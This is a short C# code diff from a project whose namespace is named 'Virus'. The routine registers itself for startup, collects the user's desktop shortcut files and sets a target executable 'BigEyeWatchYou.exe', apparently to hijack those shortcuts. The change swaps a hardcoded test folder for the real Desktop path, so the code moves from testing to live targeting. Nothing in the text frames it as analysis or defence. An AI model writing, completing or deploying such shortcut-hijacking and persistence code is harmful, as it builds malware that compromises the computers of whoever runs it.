@@ -19,8 +19,7 @@ namespace Virus
         {
             SetStartup();
             var folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            var testFolfer = @"C:\Users\New\Desktop\Test";
-            var files = LnkHelper.GetAllShortcutsFiles(testFolfer);
+            var files = LnkHelper.GetAllShortcutsFiles(folder);
             var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");
 
             int count = 0;
